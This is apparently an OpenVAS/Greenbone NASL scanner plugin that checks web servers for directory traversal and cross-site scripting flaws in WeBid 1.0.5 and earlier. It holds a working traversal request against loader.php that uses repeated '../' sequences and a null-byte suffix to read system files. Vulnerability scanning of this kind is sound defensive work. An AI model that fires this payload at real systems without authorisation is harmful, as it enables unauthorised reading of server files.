if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803053" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 56588 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-11-20 12:03:19 +0530 (Tue, 20 Nov 2012)" );
	script_name( "WeBid Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/80140" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22828" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/22829" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/118197/webid-traversal.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/115640/WeBid-1.0.4-RFI-File-Disclosure-SQL-Injection.html" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected
  application and execute arbitrary script code" );
	script_tag( name: "affected", value: "WeBid version 1.0.5 and prior" );
	script_tag( name: "insight", value: "The flaws are due to improper input validation:

  - Input passed via the 'js' parameter to loader.php, which allows attackers
  to read arbitrary files via a ../(dot dot) sequences.

  - Input passed via the 'Copyright' parameter to admin/settings.php, is not
  properly sanitised before it is returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WeBid and is prone to directory traversal
  and multiple cross site scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
webPort = http_get_port( default: 80 );
if(!http_can_host_php( port: webPort )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/WeBid", "/webid", "/", http_cgi_dirs( port: webPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	res = http_get_cache( item: url, port: webPort );
	if(isnull( res )){
		continue;
	}
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, ">WeBid<" ) && ContainsString( res, ">Login<" ) && ContainsString( res, ">Register now" ) && ContainsString( res, ">Sell an item" )){
		for file in keys( files ) {
			url = dir + "/loader.php?js=" + crap( data: "../", length: 3 * 15 ) + files[file] + "%00.js;";
			if(http_vuln_check( port: webPort, url: url, check_header: TRUE, pattern: file )){
				report = http_report_vuln_url( port: webPort, url: url );
				security_message( port: webPort, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

